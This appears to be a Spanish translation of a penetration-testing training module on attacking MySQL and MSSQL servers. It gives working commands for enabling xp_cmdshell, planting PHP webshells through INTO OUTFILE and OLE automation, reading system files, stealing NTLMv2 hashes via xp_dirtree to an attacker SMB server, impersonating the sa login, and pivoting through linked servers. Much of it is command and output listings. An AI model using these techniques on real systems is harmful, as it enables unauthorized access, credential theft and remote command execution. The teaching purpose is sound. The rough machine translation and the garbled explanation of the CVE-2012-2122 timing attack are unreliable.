# Attacking SQL Databases

[Mysql](https://www.mysql.com/)y[Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) son[base de datos relacional](https://en.wikipedia.org/wiki/Relational_database)Sistemas de gestión que almacenan datos en tablas, columnas y filas. Muchos sistemas de bases de datos relacionales como MSSQL y MySQL usan el[Lenguaje de consulta estructurada](https://en.wikipedia.org/wiki/SQL) (`SQL`) para consultar y mantener la base de datos.

Los hosts de bases de datos se consideran objetivos altos, ya que son responsables de almacenar todo tipo de datos confidenciales, incluidas, entre otros, las credenciales de los usuarios,`Personal Identifiable Information (PII)`, datos relacionados con el negocio e información de pago. Además, esos servicios a menudo están configurados con usuarios altamente privilegiados. Si obtenemos acceso a una base de datos, podemos aprovechar esos privilegios para más acciones, incluido el movimiento lateral y la escalada de privilegios.

---

# **Enumeración**

Por defecto, MSSQL usa puertos`TCP/1433`y`UDP/1434`y mysql usa`TCP/3306`. Sin embargo, cuando MSSQL funciona en un modo "oculto", usa el`TCP/2433`puerto. Podemos usar`Nmap`Scripts predeterminados`-sC`opción para enumerar los servicios de la base de datos en un sistema de destino:

### **Pancarta**

Atacando bases de datos SQL

```
xnoxos@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

```

La exploración NMAP revela información esencial sobre el objetivo, como la versión y el nombre de host, que podemos usar para identificar configuraciones erróneas comunes, ataques específicos o vulnerabilidades conocidas. Exploremos algunas configuraciones erróneas comunes y ataques específicos del protocolo.

---

# **Mecanismos de autenticación**

`MSSQL`Admite dos[modos de autenticación](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), lo que significa que los usuarios se pueden crear en Windows o en el servidor SQL:

| **Tipo de autenticación** | **Descripción** |
| --- | --- |
| `Windows authentication mode` | Este es el valor predeterminado, a menudo denominado`integrated`Seguridad porque el modelo de seguridad SQL Server está estrechamente integrado con Windows/Active Directory. Se confía en las cuentas específicas de usuarios y grupos de Windows para iniciar sesión en SQL Server. Los usuarios de Windows que ya han sido autenticados no tienen que presentar credenciales adicionales. |
| `Mixed mode` | El modo mixto admite la autenticación por Windows/Active Directory Cuentas y SQL Server. Los pares de nombre de usuario y contraseña se mantienen dentro de SQL Server. |

`MySQL`también admite diferente[Métodos de autenticación](https://dev.mysql.com/doc/internals/en/authentication-method.html), como el nombre de usuario y la contraseña, así como la autenticación de Windows (se requiere un complemento). Además, los administradores pueden[Elija un modo de autenticación](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode)Por muchas razones, incluida la compatibilidad, la seguridad, la usabilidad y más. Sin embargo, dependiendo de qué método se implementa, pueden ocurrir configuraciones erróneas.

En el pasado, había una vulnerabilidad[CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass)en`MySQL 5.6.x`Los servidores, entre otros, que nos permitieron omitir la autenticación utilizando repetidamente la misma contraseña incorrecta para la cuenta dada porque el`timing attack`La vulnerabilidad existía en la forma en que MySQL manejaba los intentos de autenticación.

En este ataque de tiempo, MySQL intenta repetidamente autenticarse en un servidor y mide el tiempo que le toma al servidor responder a cada intento. Al medir el tiempo que lleva al servidor responder, podemos determinar cuándo se ha encontrado la contraseña correcta, incluso si el servidor no indica el éxito o el fracaso.

En el caso de`MySQL 5.6.x`, el servidor tarda más en responder a una contraseña incorrecta que a una correcta. Por lo tanto, si tratamos repetidamente de autenticarnos con la misma contraseña incorrecta, eventualmente recibiremos una respuesta que indica que se encontró la contraseña correcta, aunque no lo fue.

### **Configiguraciones erróneas**

La autenticación mal configurada en SQL Server puede permitirnos acceder al servicio sin credenciales si el acceso anónimo está habilitado, un usuario sin contraseña está configurado, o cualquier usuario, grupo o máquina puede acceder al servidor SQL.

### **Privilegios**

Dependiendo de los privilegios del usuario, podemos realizar diferentes acciones dentro de un servidor SQL, como:

- Leer o cambiar el contenido de una base de datos
- Leer o cambiar la configuración del servidor
- Ejecutar comandos
- Leer archivos locales
- Comunicarse con otras bases de datos
- Capturar el hash del sistema local
- Hacerse pasar por los usuarios existentes
- Obtenga acceso a otras redes

En esta sección, exploraremos algunos de estos ataques.

---

# **Ataques específicos del protocolo**

Es crucial comprender cómo funciona la sintaxis SQL. Podemos usar el gratis[Fundamentos de inyección SQL](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)Módulo para presentarnos a la sintaxis SQL. A pesar de que este módulo cubre MySQL, MSSQL y la sintaxis de MySQL son bastante similares.

### **Leer/cambiar la base de datos**

Imaginemos que obtuvimos acceso a una base de datos SQL. Primero, necesitamos identificar las bases de datos existentes en el servidor, qué tablas contiene la base de datos y, finalmente, el contenido de cada tabla. Tenga en cuenta que podemos encontrar bases de datos con cientos de tablas. Si nuestro objetivo no es solo obtener acceso a los datos, deberemos elegir qué tablas pueden contener información interesante para continuar nuestros ataques, como nombres de usuario y contraseñas, tokens, configuraciones y más. Veamos cómo podemos hacer esto:

### **MySQL: conectarse al servidor SQL**

Atacando bases de datos SQL

```
xnoxos@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>

```

### **SQLCMD: conectarse al servidor SQL**

Atacando bases de datos SQL

```
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>

```

**Nota:**Cuando autenticamos a MSSQL usando`sqlcmd`Podemos usar los parámetros`-y`(Sqlcmdmaxvartypewidth) y`-Y`(Sqlcmdmaxfixedtypewidth) para una salida de mejor aspecto. Tenga en cuenta que puede afectar el rendimiento.

Si estamos aturdiendo`MSSQL`Desde Linux, podemos usar`sqsh`como alternativa a`sqlcmd`:

Atacando bases de datos SQL

```
xnoxos@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -hsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>

```

Alternativamente, podemos usar la herramienta de Impacket con el nombre`mssqlclient.py`.

Atacando bases de datos SQL

```
xnoxos@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
[!] Press help for extra shell commands
SQL>

```

**Nota:**Cuando autenticamos a MSSQL usando`sqsh`Podemos usar los parámetros`-h`para deshabilitar los encabezados y los pies de pie para un aspecto más limpio.

Al usar la autenticación de Windows, necesitamos especificar el nombre de dominio o el nombre de host de la máquina de destino. Si no especificamos un dominio o nombre de host, asumirá la autenticación SQL y se autenticará a los usuarios creados en el servidor SQL. En cambio, si definimos el dominio o el nombre de host, utilizará la autenticación de Windows. Si estamos aturdiendo una cuenta local, podemos usar`SERVERNAME\\accountname`o`.\\accountname`. El comando completo se vería como:

Atacando bases de datos SQL

```
xnoxos@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -hsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>

```

### **Bases de datos predeterminadas de SQL**

Antes de explorar el uso de la sintaxis SQL, es esencial conocer las bases de datos predeterminadas para`MySQL`y`MSSQL`. Esas bases de datos contienen información sobre la base de datos en sí y nos ayudan a enumerar los nombres de la base de datos, las tablas, las columnas, etc. Con el acceso a esas bases de datos, podemos usar algunos procedimientos almacenados del sistema, pero generalmente no contienen datos de la compañía.

**Nota:**Recibiremos un error si intentamos enumerar o conectarnos a una base de datos a la que no tenemos permisos.

`MySQL`esquemas/bases de datos del sistema predeterminados:

- `mysql`Es la base de datos del sistema que contiene tablas que almacenan la información requerida por el servidor MySQL
- `information_schema`Proporciona acceso a metadatos de la base de datos
- `performance_schema`es una característica para monitorear la ejecución de MySQL Server a un nivel bajo
- `sys`Un conjunto de objetos que ayuda a los DBA y los desarrolladores a interpretar los datos recopilados por el esquema de rendimiento

`MSSQL`esquemas/bases de datos del sistema predeterminados:

- `master`Mantiene la información para una instancia de SQL Server.
- `msdb`Utilizado por SQL Server Agent.
- `model`Una base de datos de plantilla copiada para cada nueva base de datos.
- `resource`Una base de datos de solo lectura que mantiene los objetos del sistema visibles en cada base de datos del servidor en el esquema SYS.
- `tempdb`Mantiene objetos temporales para consultas SQL.

### **Sintaxis sql**

### **Mostrar bases de datos**

Atacando bases de datos SQL

```
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)

```

Si usamos`sqlcmd`, necesitaremos usar`GO`Después de nuestra consulta para ejecutar la sintaxis SQL.

Atacando bases de datos SQL

```
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers

```

### **Seleccione una base de datos**

Atacando bases de datos SQL

```
mysql> USE htbusers;

Database changed

```

Atacando bases de datos SQL

```
1> USE htbusers
2> GO

Changed database context to 'htbusers'.

```

### **Mesas de exhibición**

Atacando bases de datos SQL

```
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)

```

Atacando bases de datos SQL

```
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles
roles_users
settings
users
(8 rows affected)

```

### **Seleccione todos los datos de la tabla "Usuarios"**

Atacando bases de datos SQL

```
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)

```

Atacando bases de datos SQL

```
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)

```

---

# **Ejecutar comandos**

`Command execution`es una de las capacidades más deseadas al atacar los servicios comunes porque nos permite controlar el sistema operativo. Si tenemos los privilegios apropiados, podemos usar la base de datos SQL para ejecutar comandos del sistema o crear los elementos necesarios para hacerlo.

`MSSQL`tiene un[procedimientos almacenados extendidos](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15)llamado[xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)que nos permiten ejecutar comandos del sistema usando SQL. Tenga en cuenta lo siguiente sobre`xp_cmdshell`:

- `xp_cmdshell`es una característica poderosa y deshabilitado de forma predeterminada.`xp_cmdshell`se puede habilitar y deshabilitar utilizando el[Gestión basada en políticas](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration)o ejecutando[sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- El proceso de Windows generado por`xp_cmdshell`tiene los mismos derechos de seguridad que la cuenta de servicio de SQL Server
- `xp_cmdshell`opera sincrónicamente. El control no se devuelve a la persona que llama hasta que se complete el comando de comando-shell

Para ejecutar comandos usando la sintaxis SQL en MSSQL, use:

### **Xp_cmdshell**

Atacando bases de datos SQL

```
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)

```

Si`xp_cmdshell`no está habilitado, podemos habilitarlo, si tenemos los privilegios apropiados, utilizando el siguiente comando:

Código:MSSQL

```
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO

```

Existen otros métodos para obtener la ejecución de comandos, como agregar[procedimientos almacenados extendidos](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [Ensamblajes de CLR](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [Trabajos de agente de servidor SQL](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), y[scripts externos](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). Sin embargo, además de esos métodos, también hay funcionalidades adicionales que se pueden usar como el`xp_regwrite`Comando que se utiliza para elevar los privilegios creando nuevas entradas en el registro de Windows. Sin embargo, esos métodos están fuera del alcance de este módulo.

`MySQL`soporte[Funciones definidas por el usuario](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/)que nos permite ejecutar el código C/C ++ como una función dentro de SQL, hay una función definida por el usuario para la ejecución de comandos en este[Repositorio de Github](https://github.com/mysqludf/lib_mysqludf_sys). No es común encontrar una función definida por el usuario como esta en un entorno de producción, pero debemos tener en cuenta que podemos usarla.

---

# **Escribir archivos locales**

`MySQL`no tiene un procedimiento almacenado como`xp_cmdshell`, pero podemos lograr la ejecución de comandos si escribimos en una ubicación en el sistema de archivos que puede ejecutar nuestros comandos. Por ejemplo, supongamos`MySQL`opera en un servidor web basado en PHP u otros lenguajes de programación como ASP.NET. Si tenemos los privilegios apropiados, podemos intentar escribir un archivo usando[Seleccionar en Outfile](https://mariadb.com/kb/en/select-into-outfile/)En el directorio de servidor web. Luego podemos navegar a la ubicación donde está el archivo y ejecutar nuestros comandos.

### **MySQL - Escribir archivo local**

Atacando bases de datos SQL

```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)

```

En`MySQL`, una variable del sistema global[seguro_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv)limita el efecto de las operaciones de importación y exportación de datos, como las realizadas por el`LOAD DATA`y`SELECT … INTO OUTFILE`declaraciones y el[Load_file ()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file)función. Estas operaciones están permitidas solo para usuarios que tienen el[ARCHIVO](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file)privilegio.

`secure_file_priv`puede establecerse de la siguiente manera:

- Si está vacía, la variable no tiene efecto, que no es una configuración segura.
- Si se establece en el nombre de un directorio, el servidor limita las operaciones de importación y exportación para funcionar solo con archivos en ese directorio. El directorio debe existir; El servidor no lo crea.
- Si se establece en NULL, el servidor deshabilita las operaciones de importación y exportación.

En el siguiente ejemplo, podemos ver el`secure_file_priv`La variable está vacía, lo que significa que podemos leer y escribir datos utilizando`MySQL`:

### **MySQL - Privilegios de archivo seguro**

Atacando bases de datos SQL

```
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)

```

Para escribir archivos usando`MSSQL`, necesitamos habilitar[Procedimientos de automatización de OLE](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), que requiere privilegios de administración, y luego ejecute algunos procedimientos almacenados para crear el archivo:

### **MSSQL: habilitar los procedimientos de automatización de OLE**

Atacando bases de datos SQL

```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

```

### **MSSQL: cree un archivo**

Atacando bases de datos SQL

```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO

```

---

# **Leer archivos locales**

Por defecto,`MSSQL`Permite que el archivo lea en cualquier archivo en el sistema operativo al que la cuenta tiene acceso de lectura. Podemos usar la siguiente consulta SQL:

### **Lea los archivos locales en MSSQL**

Atacando bases de datos SQL

```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)

```

Como mencionamos anteriormente, por defecto un`MySQL`La instalación no permite la lectura de archivos arbitrarios, pero si la configuración correcta está en su lugar y con los privilegios apropiados, podemos leer archivos utilizando los siguientes métodos:

### **MySQL - Lea los archivos locales en MySQL**

Atacando bases de datos SQL

```
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>

```

---

# **Capturar el hash del servicio MSSQL**

En el`Attacking SMB`Sección, discutimos que podríamos crear un servidor SMB falso para robar un hash y abusar de alguna implementación predeterminada dentro de un sistema operativo de Windows. También podemos robar el hash de la cuenta de servicio MSSQL utilizando`xp_subdirs`o`xp_dirtree`Procedimientos almacenados indocumentados que utilizan el protocolo SMB para recuperar una lista de directorios infantiles en un directorio principal específico del sistema de archivos. Cuando usamos uno de estos procedimientos almacenados y lo señalamos a nuestro servidor SMB, la funcionalidad de escucha del directorio obligará al servidor a autenticar y enviar el hash NTLMV2 de la cuenta de servicio que está ejecutando el servidor SQL.

Para que esto funcione, primero necesitamos comenzar[Respondedor](https://github.com/lgandx/Responder)o[impacket-smbserver](https://github.com/SecureAuthCorp/impacket)y ejecute una de las siguientes consultas SQL:

### **Xp_dirtree hash robando**

Atacando bases de datos SQL

```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------

```

### **Xp_subdirs hash robando**

Atacando bases de datos SQL

```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'

```

Si la cuenta de servicio tiene acceso a nuestro servidor, obtendremos su hash. Luego podemos intentar descifrar el hash o transmitirlo a otro anfitrión.

### **Xp_subdirs hash robando con respondedor**

Atacando bases de datos SQL

```
xnoxos@htb[/htb]$ sudo responder -I tun0                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000

```

### **Xp_subdirs hash robando con impacket**

Atacando bases de datos SQL

```
xnoxos@htb[/htb]$ sudo impacket-smbserver share ./ -smb2supportImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)
[*] Remaining connections []

```

---

# **Hacerse pasar por los usuarios existentes con MSSQL**

SQL Server tiene un permiso especial, nombrado`IMPERSONATE`, eso permite al usuario ejecutivo tomar los permisos de otro usuario o iniciar sesión hasta que el contexto se restablezca o finalice la sesión. Exploremos cómo el`IMPERSONATE`El privilegio puede conducir a la escalada de privilegios en SQL Server.

Primero, necesitamos identificar a los usuarios que podamos hacerse pasar por. Sysadmins puede hacerse pasar por el valor predeterminado, pero para los usuarios no administradores, los privilegios deben asignarse explícitamente. Podemos usar la siguiente consulta para identificar a los usuarios que podemos pasar por:

### **Identificar usuarios que podemos hacer son pasar**

Atacando bases de datos SQL

```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)

```

Para tener una idea de las posibilidades de escalada de privilegios, verifiquemos si nuestro usuario actual tiene el rol de Sysadmin:

### **Verificar nuestro usuario y rol actuales**

Atacando bases de datos SQL

```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio

(1 rows affected)

-----------
          0

(1 rows affected)

```

Como el valor devuelto`0`indica que no tenemos el rol de sysadmin, pero podemos hacerse pasar por el`sa`usuario. Permanemos del usuario y ejecutemos los mismos comandos. Para hacerse pasar por un usuario, podemos usar la instrucción Transact-SQL`EXECUTE AS LOGIN`y configúrelo al usuario que queremos hacerse pasar por.

### **Hacerse pasar por el usuario de SA**

Atacando bases de datos SQL

```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)

```

**Nota:**Se recomienda ejecutar`EXECUTE AS LOGIN`Dentro del DB maestro, porque todos los usuarios, por defecto, tienen acceso a esa base de datos. Si un usuario que está intentando hacerse pasar por alto, no tiene acceso a la DB al que se está conectando, presentará un error. Intenta moverte al maestro DB usando`USE master`.

Ahora podemos ejecutar cualquier comando como un sysadmin como valor devuelto`1`indica. Para revertir la operación y volver a nuestro usuario anterior, podemos usar la instrucción Transact-SQL`REVERT`.

**Nota:**Si encontramos un usuario que no es sysadmin, aún podemos verificar si el usuario tiene acceso a otras bases de datos o servidores vinculados.

---

# **Comunicarse con otras bases de datos con MSSQL**

`MSSQL`tiene una opción de configuración llamada[servidores vinculados](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Los servidores vinculados se configuran generalmente para habilitar el motor de la base de datos para ejecutar una instrucción Transact-SQL que incluye tablas en otra instancia de SQL Server u otro producto de base de datos como Oracle.

Si logramos obtener acceso a un servidor SQL con un servidor vinculado configurado, podemos movernos lateralmente a ese servidor de base de datos. Los administradores pueden configurar un servidor vinculado utilizando credenciales desde el servidor remoto. Si esas credenciales tienen privilegios de Sysadmin, podemos ejecutar comandos en la instancia de SQL remota. Veamos cómo podemos identificar y ejecutar consultas en servidores vinculados.

### **Identificar servidores vinculados en MSSQL**

Atacando bases de datos SQL

```
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)

```

Como podemos ver en la salida de la consulta, tenemos el nombre del servidor y la columna`isremote`, dónde`1`significa un servidor remoto, y`0`es un servidor vinculado. Podemos ver[SysServers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql)Para más información.

A continuación, podemos intentar identificar al usuario utilizado para la conexión y sus privilegios. El[EJECUTAR](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql)La declaración se puede usar para enviar comandos de transferencia a servidores vinculados. Agregamos nuestro comando entre paréntesis y especificamos el servidor vinculado entre los soportes cuadrados (`[ ]`).

Atacando bases de datos SQL

```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)

```

**Nota:**Si necesitamos usar cotizaciones en nuestra consulta al servidor vinculado, necesitamos usar cotizaciones dobles individuales para escapar de la cotización única. Para ejecutar comandos múltiples a la vez, podemos dividirlos con un semi colon (;).

Como hemos visto, ahora podemos ejecutar consultas con privilegios de Sysadmin en el servidor vinculado. Como`sysadmin`, controlamos la instancia de SQL Server. Podemos leer datos de cualquier base de datos o ejecutar comandos del sistema con`xp_cmdshell`. Esta sección cubrió algunas de las formas más comunes de atacar las bases de datos SQL Server y MySQL durante los compromisos de prueba de penetración. Existen otros métodos para atacar estos tipos de bases de datos, así como otros, como[Postgresql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql), Sqlite, Oracle,[Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database), y[Mongodb](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)que se cubrirá en otros módulos. Vale la pena tomarse un tiempo para leer sobre estas tecnologías de bases de datos y algunas de las formas comunes de atacarlas también.